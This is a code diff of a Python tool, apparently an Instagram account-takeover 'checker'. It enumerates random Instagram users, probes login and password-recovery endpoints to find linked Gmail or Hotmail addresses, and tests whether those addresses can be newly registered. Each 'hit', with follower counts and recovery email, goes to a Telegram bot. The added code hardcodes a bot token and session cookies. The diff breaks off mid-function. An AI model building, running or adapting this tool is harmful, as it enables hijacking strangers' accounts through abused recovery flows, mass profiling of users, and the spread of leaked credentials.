@@ -5,388 +5,561 @@ from uuid import uuid4
 import os
 from random import choice, randrange
 import sys
-from threading import Thread, Lock
+from threading import Thread
 from user_agent import generate_user_agent
 import time as time_module
-from flask import Flask
-import traceback
+from urllib.parse import quote
 
-# Create Flask app for Render
-app = Flask(__name__)
-
-# Disable Flask request logging
-import logging
-log = logging.getLogger('werkzeug')
-log.setLevel(logging.ERROR)
-
-# Global stats with thread lock
-stats_lock = Lock()
-global_stats = {
-    'hits': 0,
-    'bad_ig': 0,
-    'bad_email': 0,
-    'good_ig': 0,
-    'checked': 0
-}
-
-@app.route('/')
-def home():
-    with stats_lock:
-        return f'''
-        <h1>Instagram Checker Running</h1>
-        <p>Status: Active</p>
-        <p>Checked: {global_stats['checked']}</p>
-        <p>Hits: {global_stats['hits']}</p>
-        <p>Good Instagram: {global_stats['good_ig']}</p>
-        <p>Bad Instagram: {global_stats['bad_ig']}</p>
-        <p>Bad Email: {global_stats['bad_email']}</p>
-        '''
-
-@app.route('/health')
-def health():
-    return {'status': 'running', 'stats': global_stats}
-
-class InstagramChecker:
+class qredes:
     def __init__(self):
-        self.token = os.environ.get('TELEGRAM_TOKEN') or input('[+] Enter Token : ')
-        if not os.environ.get('TELEGRAM_TOKEN'):
+        self.hits = 0
+        self.bad_email = 0
+        self.bad_instgram = 0
+        self.good_insgram = 0
+        
+        # Hardcoded credentials
+        self.token = '8058556960:AAHdFM9ZyPWyh5SLqJXhozb4cEuFfM-M8qY'
+        print('[+] Token loaded')
+        
+        try:
             os.system('clear' if os.name == 'posix' else 'cls')
+        except:
+            pass
         
-        self.chat_id = os.environ.get('TELEGRAM_CHAT_ID') or input('[+] Enter ID : ')
-        if not os.environ.get('TELEGRAM_CHAT_ID'):
+        self.id = input('[+] Enter ID : ')
+        
+        try:
             os.system('clear' if os.name == 'posix' else 'cls')
+        except:
+            pass
         
-        self.MIN_USER_ID = 1
-        self.MAX_USER_ID = 150000000
-        
-        print(f"[+] Targeting 2010-2012 era users (ID range: {self.MIN_USER_ID:,} - {self.MAX_USER_ID:,})")
-        print("[+] Ranges: 2010 (1-1M) | Early 2011 (1M-10M) | Late 2011 (10M-50M) | 2012 (50M-150M)")
-        
-        # Initialize Hotmail tokens
-        self.init_hotmail_tokens()
-        
-        # Send startup message
-        self.send_startup_message()
-        
-        # Start worker threads
-        num_threads = int(os.environ.get('NUM_THREADS', '50'))
-        print(f"[+] Starting {num_threads} threads...")
-        
-        for i in range(num_threads):
-            Thread(target=self.worker, args=(i,), daemon=True).start()
-        
-        print("[+] All threads started!")
-        print("="*60)
-
-    def init_hotmail_tokens(self):
-        """Initialize Hotmail API tokens"""
+        print('[+] Getting Hotmail tokens...')
         retry_count = 0
+        max_retries = 5
+        
+        while retry_count < max_retries:
+            try:
+                session = requests.Session()
+                headers = {
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                }
+                
+                response = session.get('https://signup.live.com/signup', headers=headers, timeout=15)
+                
+                # Try to extract canary token
+                if '"apiCanary":"' in response.text:
+                    canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
+                else:
+                    print(f'[!] Retry {retry_count + 1}/{max_retries}: apiCanary not found in response')
+                    retry_count += 1
+                    time_module.sleep(2)
+                    continue
+                
+                # Try to get amsc cookie
+                if 'amsc' in session.cookies.get_dict():
+                    self.amsc = session.cookies.get_dict()['amsc']
+                else:
+                    print(f'[!] Retry {retry_count + 1}/{max_retries}: amsc cookie not found')
+                    retry_count += 1
+                    time_module.sleep(2)
+                    continue
+                
+                cookies = {
+                    'amsc': self.amsc,
+                }
+                headers = {
+                    'accept': 'application/json',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'canary': canary,
+                    'content-type': 'application/json; charset=utf-8',
+                    'origin': 'https://signup.live.com',
+                    'referer': 'https://signup.live.com/',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                }
+                json_data = {
+                    'clientExperiments': [
+                        {
+                            'parallax': 'enableplaintextforsignupexperiment',
+                            'control': 'enableplaintextforsignupexperiment_control',
+                            'treatments': [
+                                'enableplaintextforsignupexperiment_treatment',
+                            ],
+                        },
+                    ],
+                }
+                
+                response = session.post(
+                    'https://signup.live.com/API/EvaluateExperimentAssignments',
+                    cookies=cookies,
+                    headers=headers,
+                    json=json_data,
+                    timeout=15
+                ).json()
+                
+                if 'apiCanary' in response:
+                    self.canary = response['apiCanary']
+                    print('[+] Hotmail tokens obtained successfully!')
+                    break
+                else:
+                    print(f'[!] Retry {retry_count + 1}/{max_retries}: apiCanary not in response')
+                    retry_count += 1
+                    time_module.sleep(2)
+                    
+            except Exception as e:
+                retry_count += 1
+                print(f'[!] Retry {retry_count}/{max_retries}: {str(e)}')
+                time_module.sleep(3)
+        
+        if retry_count >= max_retries:
+            print('[!] Failed to get Hotmail tokens after maximum retries')
+            print('[!] Continuing with Gmail checks only...')
+            self.amsc = None
+            self.canary = None
+        
+        try:
+            os.system('clear' if os.name == 'posix' else 'cls')
+        except:
+            pass
+        
+        for _ in range(100):
+            Thread(target=self.home).start()
+    
+    def insta1(self, email):
+        while True:
+            try:
+                csrftoken = md5(str(time()).encode()).hexdigest()
+                headers = {
+                    'accept': '*/*',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': 'https://www.instagram.com',
+                    'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
+                    'x-csrftoken': csrftoken,
+                }
+                data = {
+                    'username': email,
+                }
+                response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data).text
+                if 'showAccountRecoveryModal' in response:
+                    return True
+                else:
+                    return False
+            except:
+                pass
+    
+    def insta2(self, email):
+        while True:
+            try:
+                url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+                headers = {
+                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+                    'Accept': '*/*',
+                    'Cookie': 'missing',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept-Language': 'en-US',
+                    'X-IG-Capabilities': '3brTvw==',
+                    'X-IG-Connection-Type': 'WIFI',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'Host': 'i.instagram.com'
+                }
+                uid = str(uuid4())
+                data = {
+                    'uuid': uid,
+                    'password': 'ffffdddddaaa666',
+                    'username': email,
+                    'device_id': uid,
+                    'from_reg': 'false',
+                    '_csrftoken': 'missing',
+                    'login_attempt_countn': '0'
+                }
+                re = requests.post(url, headers=headers, data=data).text
+                if 'bad_password' in re:
+                    return True
+                else:
+                    return False
+            except:
+                pass
+    
+    def check_gmail(self, email):
+        while True:
+            try:
+                if '@' in email:
+                    email = email.split('@')[0]
+                tim = (str(time()).split('.')[0])
+                headers = {
+                    'authority': 'accounts.google.com',
+                    'accept': '*/*',
+                    'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
+                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                    'cookie': 'HSID=A3TxC-A0yRsCA1dOO; SSID=ARenU9ksEOCIaEO4P; APISID=hnQUEqtNc5vHjhT9/AawmOWOOgkqM5vJze; __Host-GAPS=1:A5k8RauTcQc3xH2K66ARptqQB1AK0KdW5aT-RVZponPE3KiUShdpDjzVOMKscyGbCOTsVTxN6fuwkjWokE8qNLrm6MR4pg:hClD8NNycPp_GmJW;',
+                    'origin': 'https://accounts.google.com',
+                    'referer': 'https://accounts.google.com/',
+                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                    'sec-ch-ua-arch': '"x86"',
+                    'sec-ch-ua-bitness': '"64"',
+                    'sec-ch-ua-full-version': '"124.0.6327.4"',
+                    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-model': '""',
+                    'sec-ch-ua-platform': '"Linux"',
+                    'sec-ch-ua-platform-version': '""',
+                    'sec-ch-ua-wow64': '?0',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': generate_user_agent(),
+                    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
+                    'x-client-data': 'CLrdygE=',
+                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
+                    'x-goog-ext-391502476-jspb': '["S336499450:1722131730722296"]',
+                    'x-same-domain': '1',
+                }
+                par = {
+                    'biz': 'false',
+                    'continue': 'https://mail.google.com/mail/mu/mp/580/?login=1',
+                    'ddm': '0',
+                    'dsh': f'S-{tim}:1722139307145196',
+                    'flowEntry': 'SignUp',
+                    'flowName': 'GlifWebSignIn',
+                }
+                re = requests.get(f'https://accounts.google.com/lifecycle/flows/signup?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1&ddm=0&flowEntry=SignUp&flowName=GlifWebSignIn&dsh=S{tim}%3A1722152876221519', params=par, cookies=None, headers=headers)
+                try:
+                    tok = re.text.split("3DGlifWebSignIn%26TL%3D")[2].split("','")[0]
+                except:
+                    tok = ""
+                
+                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0eKMHZmgEC_FYSd7DksXn11%3A1722139309078&'
+                params = {
+                    'TL': tok,
+                }
+                re = requests.post(
+                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
+                    params=params,
+                    cookies=None,
+                    headers=headers,
+                    data=data,
+                ).text
+                if 'signup' in re:
+                    return True
+                else:
+                    return False
+            except Exception as e:
+                pass
+    
+    def get_info(self, username, domen):
+        try:
+            headers = {
+                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+                'X-Pigeon-Rawclienttime': '1700251574.982',
+                'X-IG-Connection-Speed': '-1kbps',
+                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+                'X-IG-Bandwidth-TotalBytes-B': '0',
+                'X-IG-Bandwidth-TotalTime-MS': '0',
+                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+                'X-IG-Connection-Type': 'WIFI',
+                'X-IG-Capabilities': '3brTvw==',
+                'X-IG-App-ID': '567067343352427',
+                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+                'Accept-Language': 'en-GB, en-US',
+                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Accept-Encoding': 'gzip, deflate',
+                'Host': 'i.instagram.com',
+                'X-FB-HTTP-Engine': 'Liger',
+                'Connection': 'keep-alive',
+                'Content-Length': '356',
+            }
+            data = {
+                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + username + '"}',
+                'ig_sig_key_version': '4',
+            }
+            try:
+                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data)
+                rest = response.json()['email']
+            except:
+                rest = None
+            
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'en',
+                'referer': 'https://www.instagram.com/{}/'.format(username),
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
+                'x-ig-app-id': '936619743392459',
+                'x-ig-www-claim': '0',
+                'x-requested-with': 'XMLHttpRequest',
+            }
+            params = {
+                'username': username,
+            }
+            try:
+                response = requests.get(
+                    'https://www.instagram.com/api/v1/users/web_profile_info/',
+                    params=params,
+                    headers=headers,
+                ).json()
+            except:
+                response = None
+            
+            try:
+                id = response['data']['user']['id']
+            except:
+                id = None
+            try:
+                followerNum = response['data']['user']['edge_followed_by']['count']
+            except:
+                followerNum = None
+            try:
+                followingNum = response['data']['user']['edge_follow']['count']
+            except:
+                followingNum = None
+            try:
+                postNum = response['data']['user']['edge_owner_to_timeline_media']['count']
+            except:
+                postNum = None
+            try:
+                isPraise = response['data']['user']['is_private']
+            except:
+                isPraise = None
+            try:
+                full_name = response['data']['user']['full_name']
+            except:
+                full_name = None
+            try:
+                biography = response['data']['user']['biography']
+            except:
+                biography = None
+            try:
+                if id == None:
+                    date = None
+                else:
+                    try:
+                        date = requests.get('https://mel7n.pythonanywhere.com/?id={}'.format(id)).json()['date']
+                    except:
+                        date = None
+            except:
+                date = None
+            
+            # Create message text
+            info = '''⌯ Hi PRIME Got Hit
+───────────
+followers: {}
+following: {}
+total posts: {}
+isPraise: {}
+username: {}
+email: {}@{}
+date: {}
+id: {}
+full name: {}
+bio: {}
+rest: {}
+Instagram: https://instagram.com/{}
+───────────
+by: @m0hsvn'''.format(followerNum, followingNum, postNum, isPraise, username, username, domen, date, id, full_name, biography, rest, username)
+            
+            print(info)
+            with open('hits.txt', 'a', encoding='utf-8') as f:
+                f.write(info + '\n\n')
+        except:
+            info = '''⌯ Hi PRIME Got Hit
+───────────
+followers: {}
+following: {}
+total posts: {}
+isPraise: {}
+username: {}
+email: {}@{}
+date: {}
+id: {}
+full name: {}
+bio: {}
+rest: {}
+Instagram: https://instagram.com/{}
+───────────
+by: @m0hsvn'''.format(None, None, None, None, username, username, domen, None, None, None, None, None, username)
+            
+            print(info)
+            with open('hits.txt', 'a', encoding='utf-8') as f:
+                f.write(info + '\n\n')
+        
+        # Send to Telegram with proper URL encoding and error handling
+        print(f"\n[*] Attempting to send to Telegram (Chat ID: {self.id})...")
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
+                # Send using POST method with proper JSON data (more reliable)
+                url = f'https://api.telegram.org/bot{self.token}/sendMessage'
+                payload = {
+                    'chat_id': str(self.id),
+                    'text': info
+                }
+                
+                print(f"[*] Attempt {attempt + 1}/{max_retries}...")
+                response = requests.post(url, json=payload, timeout=10)
+                
+                print(f"[*] Response status: {response.status_code}")
+                print(f"[*] Response text: {response.text}")
+                
+                if response.status_code == 200:
+                    response_json = response.json()
+                    if response_json.get('ok'):
+                        print(f"[✓] Message sent to Telegram successfully!")
+                        return
+                    else:
+                        print(f"[!] Telegram API returned ok=false: {response.text}")
+                else:
+                    print(f"[!] Telegram API returned status {response.status_code}: {response.text}")
+                    
+            except Exception as e:
+                print(f"[!] Attempt {attempt + 1} failed to send to Telegram: {str(e)}")
+                if attempt < max_retries - 1:
+                    time_module.sleep(2)  # Wait before retry
+        
+        print(f"[✗] Failed to send message to Telegram after {max_retries} attempts")
+    
+    def check_hotmail(self, email):
+        # Skip if tokens weren't obtained
+        if self.amsc is None or self.canary is None:
+            return False
+            
+        while True:
+            try:
+                cookies = {
+                    'amsc': self.amsc,
+                }
+                headers = {
+                    'accept': 'application/json',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'canary': self.canary,
+                    'content-type': 'application/json; charset=utf-8',
+                    'origin': 'https://signup.live.com',
+                    'referer': 'https://signup.live.com/',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                }
+                json_data = {
+                    'signInName': email,
+                }
+                response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data, timeout=10).text
+                if '"isAvailable":true' in response:
+                    return True
+                else:
+                    return False
+            except Exception as e:
+                return False
+    
+    def get_username(self):
         while True:
             try:
                 headers = {
-                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+                    'accept': '*/*',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': 'https://www.instagram.com',
+                    'priority': 'u=1, i',
+                    'sec-ch-prefers-color-scheme': 'dark',
+                    'sec-ch-ua': '"Opera";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
+                    'sec-ch-ua-full-version-list': '"Opera";v="111.0.5168.61", "Chromium";v="125.0.6422.143", "Not.A/Brand";v="24.0.0.0"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-model': '""',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-ch-ua-platform-version': '"10.0.0"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
+                    'x-asbd-id': '129477',
+                    'x-bloks-version-id': '213c82555f99bb0cecb045c627a22f08209d7a699fc238c7e73a0482e70267f9',
+                    'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
+                    'x-fb-friendly-name': 'PolarisProfilePageContentDirectQuery',
+                    'x-fb-lsd': '3TdmFoJ7r2hQowntSy6Exd',
+                    'x-ig-app-id': '936619743392459',
+                    'x-ig-www-claim': 'hmac.AR3iNxyHufbREf9pIUL6m2ciMIIxA3vQTyCHW_yWjgu5dmsq',
                 }
-                response = requests.get('https://signup.live.com/signup', headers=headers, timeout=10)
-                canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
-                self.amsc = response.cookies.get_dict()['amsc']
-                
-                cookies = {'amsc': self.amsc}
-                headers['canary'] = canary
-                headers['content-type'] = 'application/json; charset=utf-8'
-                
-                json_data = {'clientExperiments': [{'parallax': 'enableplaintextforsignupexperiment', 'control': 'enableplaintextforsignupexperiment_control', 'treatments': ['enableplaintextforsignupexperiment_treatment']}]}
-                
-                response = requests.post('https://signup.live.com/API/EvaluateExperimentAssignments', cookies=cookies, headers=headers, json=json_data, timeout=10).json()
-                self.canary = response['apiCanary']
-                print("[+] Hotmail tokens initialized")
-                return
+                data = {
+                    'av': '17841408545457742',
+                    '__user': '0',
+                    '__a': '1',
+                    '__req': '53',
+                    'variables': '{"id":"' + str(randrange(1, 402149008)) + '","render_surface":"PROFILE"}',
+                    'doc_id': '7663723823674585',
+                }
+                username = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data).json()['data']['user']['username']
+                return [username]
             except Exception as e:
-                retry_count += 1
-                print(f"[!] Hotmail init error (attempt {retry_count}): {str(e)[:100]}")
-                time_module.sleep(3)
-
-    def send_startup_message(self):
-        """Send startup notification"""
-        msg = f'''🚀 Instagram Checker Started! 🚀
-═══════════════════════════
-✅ Status: Running
-🎯 Target: 2010-2012 Era
-📊 Range: 1 - 150,000,000
-🧵 Threads: {os.environ.get('NUM_THREADS', '50')}
-⏰ Time: {time_module.strftime('%Y-%m-%d %H:%M:%S')}
-═══════════════════════════
-by: @m0hsvn'''
-        
-        if self.send_telegram(msg):
-            print("[✓] Startup message sent!")
-        else:
-            print("[!] Failed to send startup message - check token/chat_id")
-
-    def send_telegram(self, message, max_retries=3):
-        """Send message to Telegram with retries"""
-        for attempt in range(max_retries):
-            try:
-                response = requests.post(
-                    f'https://api.telegram.org/bot{self.token}/sendMessage',
-                    data={'chat_id': self.chat_id, 'text': message},
-                    timeout=10
-                )
-                if response.status_code == 200:
-                    return True
-                print(f"[!] Telegram error {response.status_code}: {response.text[:100]}")
-            except Exception as e:
-                print(f"[!] Telegram send error: {str(e)[:100]}")
-            time_module.sleep(2)
-        return False
-
-    def check_instagram(self, username):
-        """Check if Instagram account exists"""
-        try:
-            csrftoken = md5(str(time()).encode()).hexdigest()
-            headers = {
-                'content-type': 'application/x-www-form-urlencoded',
-                'user-agent': 'Instagram 113.0.0.39.122 Android',
-                'x-csrftoken': csrftoken,
-            }
-            data = {'username': f'{username}@test.com'}
-            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=8)
-            return 'showAccountRecoveryModal' in response.text or 'user' in response.text
-        except:
-            return False
-
-    def get_recovery_email(self, username):
-        """Get recovery email from Instagram"""
-        try:
-            headers = {
-                'User-Agent': 'Instagram 100.0.0.17.129 Android',
-                'Content-Type': 'application/x-www-form-urlencoded',
-            }
-            data = {
-                'signed_body': f'SIGNATURE.{{"query":"{username}"}}',
-                'ig_sig_key_version': '4',
-            }
-            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, timeout=8)
-            return response.json().get('email')
-        except:
-            return None
-
-    def validate_recovery(self, username, recovery_email):
-        """Check if recovery email matches username pattern"""
-        if not recovery_email:
-            return False
-        try:
-            masked = recovery_email.split('@')[0]
-            return masked[0].lower() == username[0].lower() and masked[-1].lower() == username[-1].lower()
-        except:
-            return False
-
-    def guess_domain(self, recovery_email):
-        """Guess email domain from masked recovery"""
-        if not recovery_email:
-            return None
-        try:
-            domain = recovery_email.split('@')[1].lower()
-            if '*' not in domain:
-                return domain
-            
-            first = domain[0]
-            length = len(domain)
-            
-            mappings = {
-                'g': {9: 'gmail.com', 10: 'gmail.com'},
-                'h': {11: 'hotmail.com', 12: 'hotmail.com'},
-                'o': {11: 'outlook.com'},
-                'y': {9: 'yahoo.com', 10: 'yahoo.com'},
-                'a': {7: 'aol.com', 8: 'aol.com'},
-                'i': {10: 'icloud.com', 11: 'icloud.com'},
-                'l': {8: 'live.com'},
-                'm': {7: 'msn.com', 8: 'mail.com', 9: 'mail.com'}
-            }
-            
-            if first in mappings and length in mappings[first]:
-                return mappings[first][length]
-            
-            defaults = {'g': 'gmail.com', 'h': 'hotmail.com', 'o': 'outlook.com', 'y': 'yahoo.com', 'a': 'aol.com'}
-            return defaults.get(first)
-        except:
-            return None
-
-    def check_gmail(self, email):
-        """Check Gmail availability"""
-        try:
-            username = email.split('@')[0]
-            headers = {
-                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                'user-agent': generate_user_agent(),
-            }
-            data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{username}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&'
-            response = requests.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', headers=headers, data=data, timeout=8)
-            return 'signup' in response.text
-        except:
-            return False
-
-    def check_hotmail(self, email):
-        """Check Hotmail/Outlook availability"""
-        try:
-            headers = {
-                'canary': self.canary,
-                'content-type': 'application/json',
-            }
-            response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies={'amsc': self.amsc}, headers=headers, json={'signInName': email}, timeout=8)
-            return '"isAvailable":true' in response.text
-        except:
-            return False
-
-    def get_profile_info(self, username):
-        """Get Instagram profile details"""
-        try:
-            headers = {
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'x-ig-app-id': '936619743392459',
-            }
-            response = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/', params={'username': username}, headers=headers, timeout=8).json()
-            user = response['data']['user']
-            return {
-                'id': user.get('id'),
-                'followers': user.get('edge_followed_by', {}).get('count'),
-                'following': user.get('edge_follow', {}).get('count'),
-                'posts': user.get('edge_owner_to_timeline_media', {}).get('count'),
-                'private': user.get('is_private'),
-                'name': user.get('full_name'),
-                'bio': user.get('biography')
-            }
-        except:
-            return {}
-
-    def worker(self, thread_id):
-        """Main worker thread"""
+                pass
+    
+    def home(self):
         while True:
             try:
-                user_id = randrange(self.MIN_USER_ID, self.MAX_USER_ID)
+                sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instagram : {self.good_insgram}\r''')
+                sys.stdout.flush()
                 
-                # Get username from ID
-                try:
-                    headers = {
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'user-agent': 'Mozilla/5.0',
-                        'x-ig-app-id': '936619743392459',
-                    }
-                    data = {'variables': f'{{"id":"{user_id}","render_surface":"PROFILE"}}', 'doc_id': '7663723823674585'}
-                    response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data, timeout=8).json()
-                    username = response['data']['user']['username']
-                except:
-                    continue
+                while True:
+                    try:
+                        usernames = self.get_username()
+                        if usernames == None:
+                            pass
+                        else:
+                            break
+                    except:
+                        pass
                 
-                with stats_lock:
-                    global_stats['checked'] += 1
-                    checked = global_stats['checked']
-                
-                print(f"[{thread_id}] Checking: {username} (#{checked})")
-                
-                # Check Instagram
-                if not self.check_instagram(username):
-                    with stats_lock:
-                        global_stats['bad_ig'] += 1
-                    print(f"[{thread_id}] ✗ No Instagram: {username}")
-                    continue
-                
-                with stats_lock:
-                    global_stats['good_ig'] += 1
-                
-                print(f"[{thread_id}] ✓ Has Instagram: {username}")
-                
-                # Get recovery email
-                recovery = self.get_recovery_email(username)
-                if not recovery:
-                    print(f"[{thread_id}] ✗ No recovery: {username}")
-                    self.send_telegram(f"⚠️ Account: {username}\n❌ No recovery email\n🔗 instagram.com/{username}")
-                    continue
-                
-                print(f"[{thread_id}] Recovery: {recovery}")
-                
-                # Validate pattern
-                if not self.validate_recovery(username, recovery):
-                    print(f"[{thread_id}] ✗ Pattern mismatch: {username}")
-                    self.send_telegram(f"⚠️ Account: {username}\n📩 Recovery: {recovery}\n❌ Pattern mismatch\n🔗 instagram.com/{username}")
-                    continue
-                
-                # Guess domain
-                domain = self.guess_domain(recovery)
-                if not domain:
-                    print(f"[{thread_id}] ✗ Unknown domain: {recovery}")
-                    self.send_telegram(f"⚠️ Account: {username}\n📩 Recovery: {recovery}\n❌ Unknown domain\n🔗 instagram.com/{username}")
-                    continue
-                
-                print(f"[{thread_id}] Domain: {domain}")
-                
-                # Check availability
-                email = f"{username}@{domain}"
-                available = False
-                
-                if domain in ['hotmail.com', 'outlook.com', 'live.com', 'msn.com']:
-                    available = self.check_hotmail(email)
-                elif domain == 'gmail.com':
-                    available = self.check_gmail(email)
-                else:
-                    available = True  # Can't check, assume available
-                
-                if not available:
-                    with stats_lock:
-                        global_stats['bad_email'] += 1
-                    print(f"[{thread_id}] ✗ Email taken: {email}")
-                    self.send_telegram(f"⚠️ Account: {username}\n📩 Recovery: {recovery}\n📧 Email: {email}\n❌ Email taken\n🔗 instagram.com/{username}")
-                    continue
-                
-                # HIT FOUND!
-                with stats_lock:
-                    global_stats['hits'] += 1
-                    hits = global_stats['hits']
-                
-                print(f"[{thread_id}] 🎯 HIT #{hits}: {username}")
-                
-                # Get profile info
-                profile = self.get_profile_info(username)
-                
-                # Send to Telegram
-                msg = f'''🎯 HIT FOUND! 🎯
-═══════════════════════════
-📧 Email: {email}
-👤 Username: {username}
-👥 Followers: {profile.get('followers', 'N/A')}
-👣 Following: {profile.get('following', 'N/A')}
-📸 Posts: {profile.get('posts', 'N/A')}
-🔒 Private: {profile.get('private', 'N/A')}
-🔗 Link: instagram.com/{username}
-🆔 ID: {profile.get('id', 'N/A')}
-📝 Name: {profile.get('name', 'N/A')}
-💬 Bio: {profile.get('bio', 'N/A')}
-📩 Recovery: {recovery}
-═══════════════════════════
-Hit #{hits} | by: @m0hsvn'''
-                
-                if self.send_telegram(msg):
-                    print(f"[{thread_id}] ✅ Sent to Telegram!")
-                else:
-                    print(f"[{thread_id}] ❌ Failed to send!")
-                
+                for username in usernames:
+                    sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instagram : {self.good_insgram}\r''')
+                    sys.stdout.flush()
+                    
+                    api1 = choice(['1', '2'])
+                    api2 = choice(['1', '2'])
+                    email1 = username + '@gmail.com'
+                    email2 = username + '@hotmail.com'
+                    
+                    if '1' == api1:
+                        s11 = self.insta1(email1)
+                    elif '2' == api1:
+                        s11 = self.insta2(email1)
+                    else:
+                        s11 = False
+                    
+                    if '1' == api2:
+                        s22 = self.insta1(email2)
+                    elif '2' == api2:
